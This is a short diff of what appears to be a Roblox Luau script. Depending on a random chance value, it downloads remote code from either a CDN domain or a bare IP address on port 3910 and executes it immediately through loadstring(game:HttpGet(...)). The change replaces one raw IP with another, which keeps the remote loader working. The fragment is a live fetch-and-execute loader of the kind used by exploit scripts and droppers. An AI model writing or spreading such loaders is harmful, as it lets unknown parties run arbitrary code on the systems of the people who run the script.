@@ -8,5 +8,5 @@ if chance <= 20 then
     loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
 else
     ID="b9853cc5-5458-4d91-8183-65d410bd2bc2";
-loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
 end
